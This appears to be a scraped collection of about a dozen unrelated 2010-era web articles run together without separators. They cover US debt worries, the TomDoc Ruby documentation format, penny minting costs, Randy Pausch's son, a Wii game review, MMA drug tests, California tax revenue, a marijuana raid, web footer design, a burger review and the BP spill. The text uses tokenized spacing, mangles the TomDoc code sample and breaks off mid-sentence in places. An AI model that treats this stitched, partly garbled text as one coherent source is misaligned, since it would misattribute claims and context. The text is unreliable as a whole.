At the very least , I think we ’re going to start seeing the stock market factoring in the impact of the tax hikes that will take effect in January , possibly resulting in sell - offs late in the year as investors decide to take profits now rather than when the higher tax rates go into effect .
It ’s a perfectly rational response to the impending change in government policy .
Whether the repeal will also result in a recession is a question that ’s above my pay - grade , but I would n’t be surprised if it did .
Before we get to 2011 , though , one analyst believes we have more immediate concerns coming from Europe :
Bond markets could get very nasty over the coming months , while stock investors could take a few months off and stop attempting to trade volatile swings in the markets , Anthony Fry , senior managing director at Evercore Partners , told CNBC Monday .
The current problems will be with us for 5 years or more and uncertainty is very high , ” Fry said .
“ Sentiment is extremely volatile as shown by the collapse of the Prudential ’s attempt to buy AIA .
When the deal was thought up just a few months ago it was a very different world , ” Fry told CNBC on Monday .
Fry says the best we can hope for in the current environment is a soft landing , but sees little chance of this happening . ( …)
“ Governments need to cut spending and raise money and if they do not do so credibly will be killed by the bond market demanding higher rates , ” he said .
That ’s the Sovereign Debt Crisis , and it ’s poised to hit the United States before long :
President Barack Obama is poised to increase the U.S. debt to a level that exceeds the value of the nation ’s annual economic output , a step toward what Bill Gross called a “ debt super cycle . ”
The CHART OF THE DAY tracks U.S. gross domestic product and the government ’s total debt , which rose past $ 13 trillion for the first time this month .
The amount owed will surpass GDP in 2012 , based on forecasts by the International Monetary Fund . ( …)
“ Over the long term , interest rates on government debt will likely have to rise to attract investors , ” said Hiroki Shimazu , a market economist in Tokyo at Nikko Cordial Securities Inc. , a unit of Japan ’s third - largest publicly traded bank .
“ That will be a big burden on the government and the people . ”
Gross , who runs the world ’s largest mutual fund at Pacific Investment Management Co. in Newport Beach , California , said in his June outlook report that “ the debt super cycle trend ” suggests U.S. economic growth wo n’t be enough to support the borrowings “ if real interest rates were ever to go up instead of down . ”
And higher interest rates , of course , will mean higher government spending , and higher budget deficits .
Thus creating a self - sustaining process in which the debt keeps increasing , at ever higher rates , until it reaches a point where it ’s simply unsustainable .
I do n’t buy into the idea that the economic house of cards is about to collapse , although after the fall of 2008 I would think it would be foolish to say that it ’s totally impossible , but we ’re certainly headed into an era of sustained problems thanks to a debt crisis that we should have seen coming decades ago .
TomDoc - Reasonable Ruby Documentation
RDoc is an abomination .
It ’s ugly to read in plain text , requires the use of the inane : nodoc : tag to prevent private method documentation from showing up in final rendering , and does nothing to encourage complete or unambiguous documentation of classes , methods , or parameters .
YARD is much better but goes too far in the other direction ( and still does n’t look good in plain text ) .
Providing an explicit way to specify parameters and types is great , but having to remember a bunch of strict tag names in order to be compliant is not a good way to encourage coders to write documentation .
And again we see a @private tag that ’s necessary to hide docs from the final render .
Three years ago , after suffering with these existing documentation formats for far too long , I started using my own documentation format .
It looked a bit like RDoc but had a set of conventions for specifying parameters , return values , and the expected types .
It used plain language and full sentences so that a human could read and understand it without having to parse machine - oriented tags or crufty markup .
I called this format TomDoc , because if Linus can name stuff after himself , then why ca n’t I ?
After years in the making , TomDoc is finally a well specified documentation format .
You can find the full spec at http://tomdoc.org.
But enough talk .
Here ’s a sample of what a TomDoc ’d method might look like :
# Public : Duplicate some text an abitrary number of times .
# # text - The String to be duplicated .
# count -
The Integer number of times to duplicate the text .
# # Examples # # multiplex (' Tom ' , 4 ) # # => ' TomTomTomTom ' # # Returns the duplicated String .
def multiplex ( text , count ) text * count end
At first glance you ’ll notice a few things .
First , and most important , is that the documentation looks nice in plain text .
When I ’m working on a project , I need to be able to scan and read method documentation quickly .
Littering the docs with tags and markup ( especially HTML markup ) is not acceptable .
Code documentation should be optimized for human consumption .
Second , all parameters and return values , and their expected types are specified .
Types are generally denoted by class name .
Because Ruby is so flexible , you are not constrained by a rigid type declaration syntax and are free to explain precisely how the expected types may vary under different circumstances .
Finally , the basic layout is designed to be easy to remember .
Once you commit a few simple conventions to memory , writing documentation becomes second nature , with all of the tricky decision making already done for you .
Today ’s Ruby libraries suffer deeply from haphazard versioning schemes .
Even RubyGems itself does not follow a sane or predictable versioning pattern .
This lack of discipline stems from the absence of well defined Public APIs .
TomDoc attempts to solve this problem by making it simple to define an unambiguous Public API for your library .
Instead of assuming that all classes and methods are intended for public consumption , TomDoc makes the Public API opt-in .
To denote that something is public , all you have to do is preface the main description with “ Public : ” .
By forcing you to explicitly state that a class or method is intended for public consumption , a deliberate and thoughtful Public API is automatically constructed that can inform disciplined version changes according to the tenets of Semantic Versioning .
In addition , the prominent display of “ Public ” in a method description ensures that developers are made aware of the sensitive nature of the method and do not carelessly change the signature of something in the Public API .
Once a Public API has been established , some very exciting things become possible .
We ’re currently working on a processing tool that will render TomDoc into various forms ( terminal , HTML , etc ) .
If you run this tool on a library , you ’ll get a printout of the Public API documentation .
You can publish this online so that others have easy access to it .
When you roll a new version of the library , you can run the tool again , giving it a prior version as a base , and have it automatically display only the methods that have changed .
This diff will be extremely useful for users while they upgrade to the new version ( or so they can evaluate whether an upgrade is warranted ) !
While I ’ve been using various nascent forms of TomDoc for several years , we ’re just now starting to adopt it for everything we do at GitHub .
Now that I ’ve formalized the spec it will be easy for the entire team to write compliant TomDoc .
The goal is to have every class , method , and accessor of every GitHub library documented .
In the future , once we have proper tooling , we ’d even like to create a unit test that will fail if anything is missing documentation .
TomDoc is still a rough specification so I ’m initially releasing it as 0.9.0 .
Over the coming months I ’ll make any necessary changes to address user concerns and release a 1.0.0 version once things have stabilized .
If you ’d like to suggest changes , please open an issue on the TomDoc GitHub repository .
For four years , given the rising price of metals , it has cost the U.S.
Mint more to produce and distribute the penny and the nickel than they are worth .
As the Wall Street Journal noted , " like many things produced in Washington , U.S. coins are n't what they seem . "
A penny , which in 2009 cost 1.62 cents to make , is mostly zinc .
The nickel , which cost 5.79 cents , has more copper than nickel .
Silver ?
No U.S. coin has any .
" Making coins from more cost - effective materials could save more than $ 100 million a year , which is n't just pocket change , " said Dan Tangherlini , the Treasury Department 's chief financial officer .
So President Obama is proposing to save money by making the coins from cheaper material than their namesakes .
Mindful of the likely uproar from the zinc industry , laundromat owners and coin collectors , the government is not disclosing its option .
Speculation centers on aluminum alloy , which other countries use , or perhaps industrial porcelain , embedded with an ID chip .
Vending machine owners and laundromat businesses are poised for a fight -- worried that any change in size , weight and metal content would require costly retooling or even replacement of their machines .
" We 're all taxpayers , and we 're all in favor of being able to mint coins at a more reasonable cost , " said Brian Wallace , president of the Coin Laundry Assn .
" But we want to make sure there are n't unintended consequences that could deeply impact the small business owner during a recession . "
For their part , coin collectors seem more tepid in their response .
" I am not necessarily opposed as long the new coins are not awful , " said one writer on the Coin Community Info Blog .
" I am glad to see there is no plan to get rid of the penny . "
And the penny , as they say , is where the rub is .
Periodically a member of Congress , usually Ohio Democrat Zack Space , introduces a bill to change U.S. coin content or even banish the penny , on grounds that it is a costly expense for business owners .
But advocacy groups like Americans for Common Cents , backed by the zinc industry , usually manage to defeat the idea .
" The penny is a hedge to inflation , " argues Mark Weller , the group 's executive director .
Without it , he adds , businesses would merely round up to a nickel .
In its 2010 budget asking Treasury to research alternative coin content , the Obama administration made no mention of the 1 - cent coin , which now costs 2 cents to make .
As the president keeps saying , with a full plate , you have to pick your political battles carefully .

This dog should have a segment on the next " Jackass " movie !
Son of Randy Pausch , ' Last Lecturer , ' Follows in His Father 's Footsteps Dylan Pausch , 8 , continues his father 's work , lobbying for cancer funding .
June 22 , 2010  -- Randy Pausch , the beloved Carnegie Mellon University professor who gave a famous " last lecture , " would be proud of one of his closest pupils , his son Dylan .
Eight - year - old Dylan Pausch , very much his father 's son , lobbied on Capitol Hill today to raise awareness for those suffering from pancreatic cancer .
Randy Pausch died from the disease in July 2008 .
" So many people are dying from pancreatic cancer and the survival rates are so low , " Dylan said .
" If we keep studying , we might be able to change that . "
Pancreatic cancer is the fourth leading cause of cancer deaths , but it gets much less funding than other cancers .
The reason is due in part to the very low survival rate .
Only 6 percent of those diagnosed with pancreatic cancer survive more than five years .
This year alone , 43,140 Americans will be diagnosed with pancreatic cancer and 36,800 of them will die .
Dylan and his mother , Jai Pausch , were in Washington to lobby , along with 500 other members of the Pancreatic Cancer Action Network .
Two years ago , 47 - year - old Randy Pausch , then suffering from terminal cancer , was a computer science professor at Carnegie Mellon .
His illness became too much and he had to leave his university .
He gave one last lecture , called " Really Achieving Your Childhood Dreams . "
A videotape of the lecture made it way onto the Internet and into the hearts of millions .
" So what were my childhood dreams ? "
Randy told the crowd of 400 in 2007 .
" Being in zero gravity , playing in the National Football League , authoring an article in the World Book Encyclopedia .
I guess you can tell the nerds early . "
His blend of humor and courage was so inspiring .
" We can't change the cards we are dealt , just how we play the hand , " he said .
" I do n't know how not to have fun , all right ?
I 'm dying and I 'm having fun . "
The lecture has been clicked on at least 11 million times on YouTube and some 4 million people have bought Pausch 's book .
Randy 's last days were devoted to his family , leaving behind memories and stories , not big life lessons he told ABC News , but things like his favorite foods and even the " boneheaded mistakes " he 'd made in life .
His book , " The Last Lecture , " had a chapter devoted just to his children .
Click HERE for more from of Randy Pausch 's Last Lecture
Randy spent two of those precious last days walking the halls of Congress in Washington , D.C.
He lobbied for increased funding for pancreatic cancer research .
" I'm here to put a human face on the disease , " he said .
Today , his son , Dylan , accompanied by his mother Jai Pausch , bravely walked those same hallways in his father 's footsteps .
Dylan talked to Washington lawmakers about the need for more funding for this lethal form of cancer .
" I think it it 's wonderful for him to see , individually we have the power as an American to make a difference , " Jai said .
" I think that this helps them say , ' Wow , I can do something , maybe I can't bring my dad back to life , but I can help other people . ' "
When the original Sin and Punishment was passed over for Western release back in 2000 it marked one of the cruellest injustices video gaming has ever experienced .
Thankfully this crime has now been partially rectified by the release of Treasure 's gloriously chaotic cult classic on the Wii's Virtual Console service , but Nintendo is clearly feeling particularly guilty because the company is going beyond the call of duty and publishing the Wii - based sequel all over the globe .
In fact Nintendo is doing more than just handling the distribution duties ; it 's taking a considerable risk .
Despite Treasure 's fame as a games creator , the studio has never enjoyed mainstream acceptance and the aforementioned lack of a North American and European release for the prequel means there 's no “ franchise buy - in " for your average Wii gamer .
Thankfully none of these things matter the moment the Sin and Punishment : Star Successor game disc slides elegantly into the Wii's media slot ; it 's obvious why Nintendo is taking such a chance on this title .
It 's absolutely amazing .
The core gameplay is very similar to the previous game ; you 're funnelled down a linear path through a wide range of 3D levels and expected to dish out all kinds of hurt on hordes of nefarious hostiles .
Your standard blaster is n't upgradeable but is powerful enough to take down most assailants and you also have a powerful charge attack which needs to be used strategically in order to eradicate as many enemies as possible .
Targeting is handled by an on - screen reticule ; the default interface uses the Wii Remote and Nunchuk , with the former influencing the position of your cross -hair .
It 's possible to lock your aim on an enemy using the B button , but this targeted fire is slightly less potent than your standard shot .
The overall setup mimics the traditional twin - stick approach favoured by FPS titles but the difference here is that your character is on - screen at all times and must be moved around in order to avoid incoming projectiles .
Thankfully you 're not just a sitting duck when the fire comes raining down ; it 's possible to perform a quick dash which makes your avatar temporarily invincible and this becomes an essential tactic on later levels .
You can also hover in the air , which means the entirety of the screen is available when you 're trying to dodge bullets – something which makes the game feel a lot more open than its predecessor , which confined you to the ground .
Your final defensive option actually doubles as a legitimate attack strategy ; melee attacks can be used to dispatch enemies at close quarters but they also nullify incoming bullets .
Low - level fire is merely neutralised but other objects – such as missiles and bombs – are deftly batted in the direction of your reticule , providing you get your timing right .
This opens up one of the most enjoyable elements of Sin and Punishment : Star Successor 's control system : there 's nothing quite as satisfying as locking - on to an enemy and then destroying them with the very same rocket they launched in order to bring about their own demise .
Despite the presence of two characters – both of which possess slightly different “ charge shot " capabilities – the two - player mode is n't as exhaustive as you might expect .
The second player is limited to controlling a disembodied cross -hair and can't lock - on to enemies or inflict charge attacks .
It 's a minor disappointment when you consider how great the single - player element is , but it could be argued that adding another on - screen character would make an already overcrowded screen even more confusing .
Like so many of Treasure 's previous titles there 's a distinct emphasis on high scores in Sin and Punishment : Star Successor .
Linking together successive kills ramps up your score multiplier and taking out enemies with deflected projectiles also yields points bonuses .
To further increase the appeal of chasing your personal best ranking , Treasure has included online leaderboards that illustrate the depressing gulf between the world 's best and worst players ; after each level your achievement is uploaded for posterity and the game is quick to point out when you 've topped your previous high score .
Thankfully it's not just the gameplay which hits the jackpot – the presentation is equally alluring , too .
Much has been made of the Wii's relatively humble graphical prowess but aside from the lack of HD , Sin and Punishment : Star Successor is arguably as attractive as most 360 or PS3 titles .
The vast and sprawling environments seem to go on forever and are bristling with enemies and other activity .
Incredibly , this lush setup rolls along at a steady frame rate , with little in the way of slowdown .
Also particularly worthy of note are the epic boss encounters that litter each level .
True to form , these contests are imaginative , challenging and incredibly entertaining ; it may take a few attempts to discover the pattern but the sense of achievement when you finally outsmart each foe is immense .
These scraps are common , too ; you can expect around three boss battles in each level , which brings to mind previous Treasure classics like Alien Soldier , Radiant Silvergun and Gunstar Heroes .
The game showcases support for a wide range of different controllers , including the GameCube pad , Zapper and Classic Controller .
However , having tinkered around with the various choices it 's clear that the default configuration is unquestionably the best .
As has been the case with many other titles , the Zapper peripheral proves awkward and unwieldy , while the Classic Controller puts essential buttons too far out of reach for truly comfortable play .
Star Successor is n't flawless , though .
The English voice acting is at best passable and at worst highly irritating ; thank goodness then that there 's the option to revert to the original Japanese vocal track .
Sadly , this change does n't affect the sickening cuteness of the lead characters .
The child - like protagonists are curiously at odds with the dark and oppressive tone of the rest of the game 's design and while it 's probably an intentional choice on Treasure 's part , it does n't sit well with this reviewer .
Such issues are easily ignored though and can be attributed to personal taste .
Strikeforce heavyweight champion Alistair Overeem has tested negative for anabolic steroids and drugs of abuse based upon independent testing that was administered by the promotion , CEO Scott Coker told Sherdog.com on Friday .
Six of the 10 tested main - card athletes from Saturday ’s Strikeforce “ Heavy Artillery " event in St. Louis have passed the in - house drug tests administered on the eve of the event , said Coker .
They include Antonio Silva Joey Villasenor , Ronaldo “ Jacare ” Souza , Rafael “ Feijao ” Cavalcante and Antwain Britt .
Test results for Overeem ’s challenger Brett Rogers Roger Gracie , and Kevin Randleman are still pending , said Coker .
An independent on - site technician from a local laboratory conducted the urinalysis screening in the event ’s host hotel following the official weigh - ins last Friday .
The Missouri Office of Athletics , which oversaw Saturday ’s event , also conducted random post - fight testing , which led to the promotion ’s decision to sweep the entire main card on its own .
“ When the commission here said they ’d only be random testing , I did n’t want there to be an ounce of doubt and have all these critics say , ‘ Ah , Alistair did n’t get tested , Feijao did n’t get tested , ’ ” Coker told Sherdog.com last Saturday in an exclusive video interview Missouri commissioner Tim Leuckenoff told Sherdog.com prior to the event that the regulatory body would test for “ all illegal and unprescribed drugs . ”
Lueckenoff said that the results would be kept confidential , per the state ’s testing protocol , but that if the state agency filed a disciplinary case against an athlete for a positive drug test , the results would become public information when the case is filed with Missouri ’s Administrative Hearing Commission .
State tax collections plummeted unexpectedly in April , wiping out months of steady gains that legislators hoped would ease their budget troubles and restore California ’s economy faster than experts predicted .
Such hope is now fading fast .
Revenue for April , the biggest revenue month because it is when most Californians pay their taxes , lagged projections by nearly 30 % — roughly $ 3 billion , according to state officials .
The drop was steep enough to erase improvements recorded in each of the four previous months .
Economists and finance officials are scurrying to analyze the data to determine what caused the April swoon .
Some suspect it sprang from new laws that changed the rhythm of tax payments .
It could also reflect the growth in unemployed residents eligible for refunds .
The April collections came almost entirely from personal income taxes .
Most corporate and sales taxes have not yet been reported .
If they , too , come in below projections , the state ’s budget problem would grow worse .
The decline sets Sacramento back as next month ’s deadline for passing a budget approaches .
Lawmakers face a deficit of $ 18.6 billion — about 20 % of general fund spending — with no easy options left for addressing it , as they have already cut state services severely and temporarily raised income , sales and vehicle taxes .
“ One pillar of the budget solution just got destroyed , and there ’s nothing that can happen between now and June that can get back the $ 3 billion , ” said Stephen Levy , director of the Center for Continuing Study of the California Economy .
The retraction could mean even deeper cuts in government services — schools , healthcare for the poor and services for the elderly .
Lawmakers may also be forced to consider more reductions in funds for public universities , as well as tax hikes .
“ It ’s hard to imagine how we ’re going to [ balance the budget ] without doing more severe damage to the economy , ” said state Sen.
Denise Moreno Ducheny ( D - San Diego ) , who chairs the Senate ’s budget committee .
For months , the Democrats who dominate the Legislature have hoped they would be able to balance the state ’s books with the help of an upswing in revenue , delaying any substantial budget cuts .
“ Folks were starting to be pretty optimistic that we were going to be able to bounce our way back from a big chunk of the problem , ” said Michael Cohen , a deputy in the state ’s nonpartisan Legislative Analyst ’s Office .
Taxes came in above expectations each month from December through March .
“ April basically wiped out those ” gains , Cohen said .
He said the state ’s economy , though on the mend , has been sending “ all sorts of mixed messages . ”
Corporations announced higher profits , but the state ’s stubborn unemployment rate reached a new high in March , 12.6 % .
Without jobs , Californians are paying fewer taxes and buying fewer goods , which depresses sales taxes .
To balance last year ’s budget , lawmakers tinkered heavily with the state tax code , speeding up the collection of taxes on businesses and individuals .
One theory about the April revenue plunge is that those accelerated collections meant some taxes rolled into the Treasury months earlier .
“ The more changes that you make , the more unpredictable it is , ” said Assembly Budget Committee Chairman Bob Blumenfield ( D - Woodland Hills ) .
Another possibility , economists said , is that many Californians were owed larger - than - expected income tax refunds after losing their jobs in 2009 .
Whether the revenue drop augurs an especially sluggish recovery is unclear .
Fred Silva , a budget analyst with the good - government group California Forward , said the woeful April returns may reflect taxpayer income from the previous year ’s recession — not an up - to - date snapshot of the economy .
Ted Gibson , a former state economist , said this was not the first time rising revenue has been followed by a plunge .
The flow of state tax revenue , he said , is notoriously hard to predict .
He said the jolt earlier in the year merely “ gave everybody an excuse to take a timeout on dealing with the budget .
Now they are pretty much back to where they were .
And unfortunately , very little has been done in the meantime . ”
Senate budget committee Vice Chairman Bob Dutton ( R - Rancho Cucamonga ) , who has been critical of Democrats ’ approach , said , “ It ’s creating a lot of pain the longer you wait to make the necessary changes . ”
The Legislature ’s top two Democrats , Senate President Pro Tem Darrell Steinberg ( D - Sacramento ) and Assembly Speaker John A. Pérez ( D - Los Angeles ) , spent Monday in Washington , pleading for aid from congressional and Obama administration officials .
Steinberg said before leaving that their goal was to gather federal commitments for $ 3 billion to $ 4 billion .
Gov. Arnold Schwarzenegger is scheduled to update his proposed budget on May 14 .
The new fiscal year begins July 1 .

Times staff writer Evan Halper contributed to this report .
​ After two days of searching by numerous members of the task force — who got all Rambo ’d up and no doubt looked positively dashing in their very best , tough looking Drug Warrior outfits — they turned up a grand total of zero marijuana plants .
According to a frustrated Lt. Joseph Vernon of the Lake County Sheriff ’s Department , the “ consensus ” was that “ the areas where plants may be located ” were inaccessible due to floodwaters from recent heavy rain .
Mm -hm , I ’m sure that ’s it , lieutenant .
“ The water is so high it ’s impossible to get to these areas , ” said Vernon .
I do n’t know , man .
If the floodwater specifically blocked access just to pot fields — since the drug warriors seem to have been able to go everywhere else — maybe the water should be charged as a co-conspirator , do n’t you think ?
Vernon , probably terrified that the lucrative “ marijuana eradication ” grant would n’t be available next year due to complete mission failure , felt called upon to boast that he ’d “ been with the department since 1986 ” and said he had “ seen times in his career ” when they had to cut down “ 50,000 to 60,000 marijuana plants . ”
Ah , glory days , right , Lt. Vernon ?
Good times .
High plant counts .
Big government grants .
Job security …
Never mind that this year ’s entire mission was a complete and foolish waste of scarce taxpayer dollars .
Forget the fact that the team totally — how do you say ? — oh , yeah , FAILED to accomplish anything at all .
Lt. Vernon , scrambling desperately for something , anything positive to say about the embarrassing situation , “ commended ” Lake County Sheriff Greg Story for his part in this sorry debacle .
According to Vernon , Sheriff Story works with various agencies on the local , state and federal level to rid the county not only of marijuana , but of drugs in general .
“ He is committed to fighting this drug problem , ” Vernon said .
“ This is just one of several operations he has put together . ”
Oh yeah , Lt. Vernon ?
Were the rest of them as completely useless as this one ?
Although no plants at all were found after the expenditure of tens of thousands of dollars and hundreds of man-hours , the task force claims its search was n’t in vain .
As the first thing visitors see , home pages and headers often steal the design spotlight .
But above - the - fold thinking neglects the natural flow of vertical page layout .
What happens when people reach the end of a page ?
You can bet that a simple copyright statement wo n’t hold visitors ’ attention , but many pages are designed with the expectation that people will find their way … or so we assume .
The bottom of a page is not the end of a website .
An informative , compelling footer is the natural place to lead people to more information within the site rather than wandering aimlessly .
Read more about the trends and innovations that follow page content and answer the unspoken question , where to from here ?
The ongoing problem of how to hold people ’s attention can be addressed in many ways : eye - popping graphics , clever use of negative space , snappy typography and well - written text .
But all too often people are left hanging when they scroll to the bottom of the page .
Should they scroll back up ?
Visit another website ?
Close the tab ?
Where the body content ends , the footer takes over .
The footer is a distinct collection of content that concludes every page of a website .
Typically , it contains a copyright statement , a link to the home page and either an email link or a link to the contact page .
Footers almost always span the width of the page .
Beyond this , they exhibit a variety of styles .
Even though it does n’t offer many links , Dishizzle makes it hard to miss the large icons at the bottom of its website .
With its search box and friendly type , this footer is both legible and useful .
Compare it to the footer on 43 Folders , which takes the opposite approach .
A handful of concise sentences explains the website ’s purpose , describes its owner and links to its web host .
After a thorough copyright statement , the page ends .
Sometimes footers merely repeat the navigation bar .
It ’s a natural fit : once the reader has read or skimmed the page , they come upon a list of interesting links to other pages , rather than be left to wander .
But those links are often just that : bits of clickable text arranged in a thin , underdeveloped strip .
While this may work for websites that have little content , a serious website is n’t complete without a well - planned footer .
A footer is not just an appendage .
It ’s a good host .
Unsung Stewards
The bottom may seem an unlikely place to put vital information , but footers are ideal real estate for navigation and important features because visitors naturally move in that direction as they scroll down .
Like a good host , an elaborate footer presents different kinds of information that reflect the nature , and content , of the website .
A footer can play many roles on a website .
The trick is deciding where guests should go when they ’re done with a page .
A good host lets their guests enjoy themselves and steps in only when the guests begin to wonder “ What ’s next ? ”
Footers as Site Maps
While the header presents links to major sections of the website , the footer can delve into details .
Site map - based footers , which are ideal for websites that store content in many sections and sub-sections , reflect the scale and concerns of a website .
The White House is a good example .
Its footer presents the website as six sections , each with as few as 6 and as many as 23 links .
Deliberately simple , the keyword links can be absorbed at a glance by guests scanning for topics of interest .
Almost as tall as it is wide , the footer is hard to miss , but its content does n’t compete with the page above .
Footers as Advertisements
Especially if the website sells something — a product , service or membership — the footer is a second chance to incite visitors to act .
The end of the page is a great place to remind guests of the benefits of the product or service being offered .
Repeating this same message on every page drives the point home .
Mail Chimp takes advantage of this space to repeat its sales pitch : 1 ) free templates , 2 ) a comparison of its service to that of competitors and 3 ) flexible pricing .
Expression Engine lists some of these things , too , and also links to the help section and other information that prospective customers would want .
Unlike plain site maps , footers that advertise must be more persuasive than informative .
They should give guests incentives to buy and lead to pages that enable them to act .
Footers as Character Studies
While a personal website would address topics that interest its owner , the footer could describe the person behind it .
Whose website is this ?
What is he or she like ?
What else do they do ?
Few websites do this better than the one of graphic designer Jason Santa Maria , whose footer could be a page unto itself .
Meanwhile , the footer of standards expert Jeffery Zeldman ’s contains visual — and even photographic — snippets of projects he is involved with or interested in .
Footer as Colophon
A footer can contain information about how or why the website was built .
It could :
Reiterate the website ’s mission or tagline .
Say which CMS or ISP is being used .
Declare that the page has valid ( X) HTML and CSS and complies with certain accessibility standards .
Variation Based on Context
The footer should generally stay consistent throughout the website .
Page - specific information usually is n’t warranted .
But complicated websites can bend the rules .
The playful icons on IBM ’s website provide a friendlier , less corporate way to navigate pages .
But these icons appear only in the “ Smarter Planet ” section .
IBM ’s regular footer looks like this :
Likewise , the links in Apple ’s site map - based footer varies according to the section it appears in .
Above , the footer in the Mac section .
Below , the one for iPods .
None of these roles are exclusive .
Elaborate footers can incorporate site maps , highlights , updates , credentials , search tools and more .
Below , BustedTees offers ways to stay current , browse and submit feedback .
Functional does n’t always translate into compelling , though .
CNN ’s footer includes a search tool , local weather , a site map , legalese and links to its content in other languages .
Useful , but dry .
The most interesting visual element is the red strip .
Although it fits the tone of the website , CNN ’s footer is merely designed not to compete with the page above .
How to Craft a Useful Footer
Generally , a web page invites people to act or to learn .
After reading a news article or blog post , people walk away with a new idea or set of facts .
Product pages educate visitors on the items being sold .
Pages with weather information affect how people dress .
In each case , a person has changed somehow by the time they reach the bottom of the page .
And there they find the footer .
So , the end of the page is a natural place to put two things : tools by which visitors can act on what they have just learned ; and calls to action .
Footers have a tough job .
People ignore them out of habit ; they instinctively scroll to the top or click away .
That ’s why good footers must be designed not as afterthoughts but as if they were pages themselves .
Creating a useful footer begins with asking certain questions :
What content on my website do I want to emphasize ?
A good footer guides guests to those pages .
A good footer guides guests to those pages .
What else would interest visitors ?
A good footer attracts guests with information they would like .
Visitors who scroll all the way to the bottom were likely engaged by the page ’s content .
Links to related information will keep them on the website .

What content would benefit visitors the most ?
Like a good host , its job is to be helpful .
The footer rewards guests for reaching the end of the page with , if possible , freebies or entertainment or , better yet , frequently requested information .
If the website is for a bricks - and - mortar business , the footer could contain a simple map to the location .

In this way , the footer is similar to the header , which introduces the website to newcomers .
T - shirt seller Threadless answers many questions in its keyword - rich footer :
Once you ’ve decided what to put in your footer , do n’t neglect presentation .
Make it big .
A token footer is thin , just tall enough to admit one line of text .
An attention - grabbing footer is substantial .
A rule of thumb is to make the footer ’s height at least a quarter of its width .
For example , if the page is 960 pixels wide , then the footer should be at least 240 pixels tall .

Make it worthwhile .
The ideal footer is strong enough to warrant the visitor ’s attention .
It offers interesting content to peruse in an attractive package — like any important page .
The Guardian is n’t afraid to play up its footer .
Eye - catching graphics laid between brand - matching color bars tell visitors that this is content , not just fine print .
Silverback has few features in its footer but plenty of style .
It offers an easy - to - read experience that restates the website ’s purpose and encourages visitors to receive updates via its newsletter .
While Travelocity packs 72 links into its footer , a lack of visual hierarchy or clear layout makes it hard to take seriously .
More does n’t always mean better .
All of these criteria may sound like a tall order , but there are two easy approaches to creating a good footer .
Approach # 1 : Create a Miniature Home Page
The easiest way to create a helpful footer is to recap the website ’s purpose and highlights .
Look at your home page for inspiration .
Typically , the home page is a cross between a table of contents and a news ticker , giving guests an overview of the website and the latest information .
A footer need not include every element from the home page .
If the home page showcases 10 best - selling products and the 3 most recent blog posts , then the footer could highlight the top 5 products and 1 post , with links to more of each .
A smaller version of the website ’s logo would also be appropriate .
Think of the footer as a table of contents that conveniently appears when visitors need it most : when they ’re wondering what ’s next .
MacTalk Australia has a relatively small header , which leaves more room for content and advertising above the fold .
Nearly twice as tall as the header , the content - rich footer expands on the simple header ’s navigation and introduction by spelling out how much content each category has and which tags are most popular .
Both the header and footer have RSS and Twitter icons , and the footer includes a newsletter sign - up form — plus two other RSS and Twitter links just below the copyright statement .
The New York Times footer includes the latest headlines and photos from various sections .
Approach # 2 : Provide Supplementary Content
Footers can do the opposite of serving as a miniature home page by offering content not found anywhere else on the website .
Bits of supplementary content that can’t fill pages on their own can find a home in the footer .
Unlike the miniature home page , a supplementary footer can contain links to other websites , as long as they ’re informative or beneficial to the guest .
But do n’t treat the footer as a dumping ground for stuff that does n’t fit anywhere else .
Like any proper page , a footer should inform , persuade , entertain or do all three .
The key is to find worthwhile information that supports the website ’s overall theme , not any one particular page .
Komodo Media ’s footer includes eye - catching links to what the owner is listening to on Last.fm .
Some websites , such as Veer , point to their family of websites .
Corporations can promote their brands simply by cross-linking them to each other .
Other Approaches
If your website has a substantial sidebar , try rearranging it as a footer .
Although this will change the website ’s layout drastically , moving secondary information to the bottom of the page might remove distractions from the primary information .
On Your Way
The golden rule of footers is never leave guests to their own devices .
Footers are hosts who present their guests with options .
They are natural stepping stones across the website , enticing guests to click to other pages — or related websites .
You can learn a lot about a website ’s priorities from the contents of the footer .
What ’s in your footer right now ?
You do have one , right ?
Because a website without a footer is worse than an article without an

Inspired by my own awesome burger list and having passed the new place last week , my girlfriend and I headed to Burger Kitchen on 3rd Street over the weekend .
The place just opened two weeks before , so I figured it had worked out enough its kinks and was ready for a good old unvegan review .
After looking over the 22 burgers ( including one for $ 50 and another for $ 65 ! ) for a bit and having a hard time deciding , the girlfriend discovered a great deal , The Champagne Brunch .
This brunch , served on weekend until 3:00 , had a limited selection of burgers and came with a side and a glass of champagne for only $ 15 .
This was a great deal since the burgers were all around 10 bucks and the sides were 3.50 .
Fortunately , the brunch also included one of the burgers I had been eying .
It was called the breakfast burger and I had been drawn to it for a few reasons .
The first was that it had a fried egg and bacon on it .
I love bacon on burgers , but love it even more when I discover one with an egg .
The other reason was that the burger made no mention of coming with lettuce , as all the others seemed to .
It had tomato on it , but I just ordered without .
For my side , I chose their home made waffle cut chips .
The champagne and side came out first , and while the chips were a definite step above regular bagged chips , they were greatly aided by the garlic aioli that came with my girlfriend ’s sweet potato fries .
The glass of champagne was also a decent size , too .
It definitely was n’t some sissy champagne glass that you pay 14 bucks for at a martini bar .
After sipping and snacking , my burger arrived and I was quite disappointed with what I found .
Piled on top of the top half of the bun was a whole load of lettuce .
And not just some leaves , no , this was the shredded kind you usually find in a taco .
Fortunately this was served open - faced and I could wipe the lettuce off pretty easily , but it was certainly an effort I had not anticipated .
After taking care of the greens , I found one massive top half of my bun .
This thing alone was taller than the rest of the burger ( including the bottom bun ) combined , and when I placed it on top of the burger and began eating , it really showed .
The burger was cooked to a nice medium and had a pretty good taste .
The egg was slightly runny , but could have used a little more juice .
Yet , overall it was tough to get a good grip on how tasty the burger was .
This was because the bun was just overwhelmingly big .
It was a shame , too , because the bun was actually good .
It was soft , a little buttery and had a good amount of moisture .
The bottom half did a good job of absorbing burger juices , but I was tempted throughout the burger to just take that top half off and eat the thing open - faced .
Despite the bun difficulty , I felt pretty contented with my meal .
They did n’t try to do anything crazy with the burger and stuck with some nice ingredients .
The Champagne Brunch portion definitely made the meal worthwhile , but next time I ’d like to see a little less bun and lot more burger .
Is enough being done to protect the public from chemical pollutants ?
Watch " Toxic America , " a special two - night investigative report with Dr. Sanjay Gupta , 8 p.m. ET on June 2 and 3 on CNN .
( CNN ) -- BP is doing all it can to respond to the oil leak in the Gulf of Mexico , a top BP official said Monday , even as criticism of the company 's handling of the crisis was growing .
" We are going to clear every drop of oil off the shore , " Tony Hayward told reporters at Fourchon Beach , Louisiana , where cleanup efforts were under way .
" We will remediate any environmental damage and we will put the Gulf Coast right and back to normality as fast as we can . "
